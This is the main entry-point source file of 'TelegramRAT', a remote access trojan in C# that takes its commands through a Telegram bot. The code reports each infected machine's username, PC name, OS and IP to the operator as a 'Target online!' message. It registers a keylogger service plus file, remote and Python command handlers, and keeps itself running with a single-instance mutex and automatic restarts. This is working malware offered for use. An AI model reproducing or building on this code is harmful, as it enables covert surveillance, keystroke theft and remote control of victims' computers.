using Microsoft.Extensions.DependencyInjection;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Utilities;
using TelegramRAT.Commands;
using System.Diagnostics;
using Telegram.Bot.Types;
using Telegram.Bot;
using System.Net;
using System.Text.Json;
using System.Threading;
using TelegramRAT.Services;
using TelegramRAT.Commands.Core;
using TelegramRAT.Commands.System;
using TelegramRAT.Commands.File;
using TelegramRAT.Commands.Remote;
using TelegramRAT.Commands.Misc;
using Telegram.Bot.Polling;

namespace TelegramRAT;

public static class Program
{
    private const string BotTokenEnvironmentVariable = "TELEGRAMRAT_BOT_TOKEN";
    private const string OwnerIdEnvironmentVariable = "TELEGRAMRAT_OWNER_ID";

    private static string BotToken = string.Empty;
    private static long OwnerId;

    public static ITelegramBotClient Bot { get; private set; } = null!;

    private static Mutex? _singleInstanceMutex;

    public static async Task Main(string[] args)
    {
        _singleInstanceMutex = new Mutex(true, "Global\\TelegramRAT_SingleInstance_Mutex", out bool createdNew);
        if (!createdNew)
        {
            Console.WriteLine("Only one instance can be online at the same time!");
            return;
        }

        if (!TryInitializeConfiguration(out var configurationErrorMessage))
        {
            Console.Error.WriteLine(configurationErrorMessage);
            return;
        }

        var services = ConfigureServices();
        using var serviceProvider = services.BuildServiceProvider();

        using var cancellationSource = new CancellationTokenSource();
        ConsoleCancelEventHandler? cancelHandler = null;
        cancelHandler = (_, eventArgs) =>
        {
            Console.WriteLine("Cancellation requested. Shutting down gracefully...");
            eventArgs.Cancel = true;
            cancellationSource.Cancel();
        };
        Console.CancelKeyPress += cancelHandler;

        var restartAttempt = 0;

        try
        {
            while (!cancellationSource.IsCancellationRequested)
            {
                TimeSpan? delayBeforeRestart = null;

                try
                {
                    Console.WriteLine("Starting Telegram bot polling.");
                    var botClient = serviceProvider.GetRequiredService<ITelegramBotClient>();
                    Bot = botClient;
                    
                    var dispatcher = serviceProvider.GetRequiredService<ICommandDispatcher>();
                    var notificationService = serviceProvider.GetRequiredService<IBotNotificationService>();
                    var winApiService = serviceProvider.GetRequiredService<IWinApiService>();
                    var networkService = serviceProvider.GetRequiredService<INetworkService>();
                    
                    await RunAsync(botClient, dispatcher, notificationService, winApiService, networkService, cancellationSource.Token);
                    break;
                }
                catch (OperationCanceledException) when (cancellationSource.IsCancellationRequested)
                {
                    Console.WriteLine("Cancellation acknowledged. Exiting.");
                    break;
                }
                catch (Exception ex)
                {
                    restartAttempt++;

                    if (!await HandleRunFailureAsync(serviceProvider.GetRequiredService<IBotNotificationService>(), ex, cancellationSource.Token, restartAttempt))
                    {
                        break;
                    }

                    delayBeforeRestart = CalculateRestartDelay(restartAttempt);
                }

                if (delayBeforeRestart.HasValue && !cancellationSource.IsCancellationRequested)
                {
                    var delay = delayBeforeRestart.Value;
                    Console.WriteLine($"Waiting {delay.TotalSeconds:F0} seconds before restart (attempt {restartAttempt}).");

                    try
                    {
                        await Task.Delay(delay, cancellationSource.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        Console.WriteLine("Cancellation requested during restart delay. Exiting.");
                        break;
                    }
                }
            }
        }
        finally
        {
            Console.CancelKeyPress -= cancelHandler;
        }
    }

    private static IServiceCollection ConfigureServices()
    {
        var services = new ServiceCollection();

        // Infrastructure
        services.AddSingleton<ITelegramBotClient>(sp => new TelegramBotClient(BotToken));
        services.AddSingleton<IBotNotificationService, BotNotificationService>();
        services.AddSingleton<IBotSession>(sp => new BotSession(OwnerId));
        services.AddSingleton<IWinApiService, WinApiService>();
        services.AddSingleton<IFileSystemService, FileSystemService>();
        services.AddSingleton<IKeyloggerService, KeyloggerService>();
        services.AddSingleton<IPythonService, PythonService>();
        services.AddSingleton<INetworkService, NetworkService>();
        services.AddSingleton<ICommandDispatcher>(sp => new CommandDispatcher(
            sp.GetServices<IBotCommand>(),
            sp.GetRequiredService<ITelegramBotClient>(),
            sp.GetRequiredService<IBotNotificationService>(),
            sp.GetRequiredService<IBotSession>()));

        // Auto-discover and register all bot commands
        var commandTypes = typeof(Program).Assembly.GetTypes()
            .Where(t => typeof(IBotCommand).IsAssignableFrom(t) && !t.IsInterface && !t.IsAbstract);

        foreach (var type in commandTypes)
        {
            services.AddSingleton(typeof(IBotCommand), type);
        }

        return services;
    }

    private static bool TryInitializeConfiguration(out string errorMessage)
    {
        var (botTokenValue, ownerIdValue, configurationSourceDescription) = LoadConfiguration();

        if (string.IsNullOrWhiteSpace(botTokenValue))
        {
            errorMessage =
                "BotToken was not provided. Set the TELEGRAMRAT_BOT_TOKEN environment variable or add it to appsettings.json.";
            return false;
        }

        if (!long.TryParse(ownerIdValue, out var ownerId) || ownerId <= 0)
        {
            errorMessage =
                "OwnerId was not provided or is invalid. Set the TELEGRAMRAT_OWNER_ID environment variable or add a numeric value to appsettings.json.";
            return false;
        }

        BotToken = botTokenValue;
        OwnerId = ownerId;

        Console.WriteLine($"TelegramRAT starting. Configuration source: {configurationSourceDescription}. Owner chat ID: {OwnerId}.");

        errorMessage = string.Empty;
        return true;
    }

    private static (string? BotToken, string? OwnerId, string ConfigurationSourceDescription) LoadConfiguration()
    {
        string? botToken = Environment.GetEnvironmentVariable(BotTokenEnvironmentVariable);
        string? ownerId = Environment.GetEnvironmentVariable(OwnerIdEnvironmentVariable);

        var configurationSources = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (!string.IsNullOrWhiteSpace(botToken) || !string.IsNullOrWhiteSpace(ownerId))
        {
            configurationSources.Add("environment variables");
        }

        var configurationFilePath = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
        if (File.Exists(configurationFilePath))
        {
            try
            {
                using var document = JsonDocument.Parse(File.ReadAllText(configurationFilePath));
                var root = document.RootElement;

                if (root.TryGetProperty("BotToken", out var botTokenElement))
                {
                    var candidate = botTokenElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(botToken))
                    {
                        botToken = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }

                if (root.TryGetProperty("OwnerId", out var ownerIdElement))
                {
                    var candidate = ownerIdElement.GetString();
                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(ownerId))
                    {
                        ownerId = candidate;
                        configurationSources.Add("appsettings.json");
                    }
                }
            }
            catch (JsonException ex)
            {
                Console.Error.WriteLine($"Failed to read configuration from appsettings.json: {ex.Message}");
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"Failed to access appsettings.json: {ex.Message}");
            }
        }

        if (configurationSources.Count == 0)
        {
            configurationSources.Add("no configuration source detected");
        }

        var configurationSourceDescription = string.Join(" & ", configurationSources.OrderBy(source => source));
        return (botToken, ownerId, configurationSourceDescription);
    }

    private static TimeSpan CalculateRestartDelay(int attempt)
    {
        var seconds = Math.Min(60, Math.Pow(2, Math.Min(10, attempt)));
        return TimeSpan.FromSeconds(seconds);
    }

    private static async Task<bool> HandleRunFailureAsync(IBotNotificationService notificationService, Exception exception, CancellationToken cancellationToken, int attempt)
    {
        Console.Error.WriteLine($"Bot run failed on attempt {attempt}: {exception}");

        var isConflict = IsConflictException(exception);

        if (OwnerId > 0)
        {
            var ownerMessage = new Message { Chat = new Chat { Id = OwnerId } };

            try
            {
                await notificationService.ReportExceptionAsync(ownerMessage, exception);

                if (isConflict)
                {
                    await notificationService.SendErrorAsync(ownerMessage, new Exception("Only one bot instance can be online at the same time."));
                }
                else if (!cancellationToken.IsCancellationRequested)
                {
                    await Bot.SendMessage(
                        OwnerId,
                        $"Attempting to restart (attempt {attempt}). Please wait...",
                        parseMode: ParseMode.Html
                    );
                }
            }
            catch (Exception notificationError)
            {
                Console.Error.WriteLine($"Failed to notify owner about the error: {notificationError}");
            }
        }

        if (isConflict)
        {
            return false;
        }

        return !cancellationToken.IsCancellationRequested;
    }

    private static bool IsConflictException(Exception exception)
        => exception.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase)
           || exception.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request", StringComparison.OrdinalIgnoreCase) == true;

    private static async Task RunAsync(ITelegramBotClient botClient, ICommandDispatcher dispatcher, IBotNotificationService notificationService, IWinApiService winApiService, INetworkService networkService, CancellationToken cancellationToken)
    {
        var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));

        var systemInfo = $"Target online!\n\nUsername: <b>{Environment.UserName}</b>\nPC name: <b>{Environment.MachineName}</b>\nOS: {winApiService.GetWindowsVersion()}\n\nIP: {await networkService.GetIpAddressAsync(cancellationToken)}";

        await botClient.SendMessage(
            OwnerId,
            systemInfo,
            ParseMode.Html,
            replyMarkup: markup,
            cancellationToken: cancellationToken
        );

        ReceiverOptions receiverOptions = new()
        {
            AllowedUpdates = Array.Empty<UpdateType>() // Receive all update types
        };

        await botClient.ReceiveAsync(
            updateHandler: async (bot, update, ct) => await dispatcher.DispatchAsync(update),
            errorHandler: async (bot, ex, ct) =>
            {
                Console.Error.WriteLine($"Polling error: {ex}");
                if (OwnerId > 0)
                {
                    var ownerMessage = new Message { Chat = new Chat { Id = OwnerId } };
                    await notificationService.ReportExceptionAsync(ownerMessage, ex);
                }
            },
            receiverOptions: receiverOptions,
            cancellationToken: cancellationToken
        );    }
}

